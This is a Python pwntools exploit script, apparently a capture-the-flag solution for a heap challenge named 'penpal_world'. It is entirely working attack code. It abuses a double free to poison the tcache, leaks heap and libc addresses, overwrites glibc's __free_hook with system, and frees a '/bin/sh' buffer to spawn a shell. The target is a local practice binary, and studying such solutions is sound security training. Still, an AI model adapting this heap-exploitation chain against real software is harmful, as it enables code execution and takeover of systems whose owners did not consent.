#!/usr/bin/python

from pwn import *
import ctf_pwn_gdb

file_name='./penpal_world'
elf = ELF(file_name)
libc = elf.libc

conn = process(file_name)
#conn = ctf_pwn_gdb.debug(elf)

def malloc(ind):
    conn.recvuntil("4) Read a postcard")
    conn.sendline('1')

    conn.recvuntil("Which envelope #?")
    conn.sendline(str(ind));

def write(ind, content):
    conn.recvuntil("4) Read a postcard")
    conn.sendline('2')
    
    conn.recvuntil("Which envelope #?")
    conn.sendline(str(ind))

    conn.recvuntil("Write.")
    conn.send(content)

def free(ind):
    conn.recvuntil("4) Read a postcard")
    conn.sendline('3')
    
    conn.recvuntil("Which envelope #?")
    conn.sendline(str(ind))

def display(ind):
    conn.recvuntil("4) Read a postcard")
    conn.sendline('4')

    conn.recvuntil("Which envelope #?")
    conn.sendline(str(ind))
    
    content = conn.recvuntil("OP")[1:-3]
    return content

# set fd of a to prev_size of b
def trigger_vuln(a, b):
    for i in range (7):
        free(a)
    free(b)
    free(a)

def overwrite_addr(pad, size, addr):
    malloc(0) # victim
    malloc(1) # A

    # overwrite victim prev_size
    write(1, p64(0)*pad + p64(size)+ p64(addr))

    # now fd of A points to addr
    trigger_vuln(1,0)

    malloc(0) # A
    malloc(1) # victim-0x10
    malloc(0) # addr
    
    # forge small chunks
    write(0, p64(0x21)+'A'*0x10+p64(0x20)+p64(0x21))
    
    malloc(0) # A
    malloc(0) # victim

def leak_heap():
    malloc(0)
    malloc(1)
    free(0)
    free(1)
    x = display(1)
    return u64(x.ljust(8, '\x00'))

def leak_libc(heap_base):
    # gain control over header chunk size of victim
    overwrite_addr(7, 0x61, heap_base + 0x16c0 + 0x420 - 0x8)
    write(1, p64(0) + p64(0x421))
    
    # now victim is in unsorted bin
    free(0)

    # get leak
    x = display(0)
    return u64(x.ljust(8, '\x00'))

# leak heap
heap_base = leak_heap()-0x1670
print(hex(heap_base))

# leak libc
libc_base = leak_libc(heap_base)-0x3ebca0
print(hex(libc_base))

# overwrite free hook
free_hook = libc.symbols['__free_hook']
system = libc.symbols['system']

malloc(1)
free(1)
write(1, p64(libc_base + free_hook))

malloc(0)
malloc(0)
write(0, p64(libc_base + system))

write(1, '/bin/sh\00')
free(1)

conn.interactive()
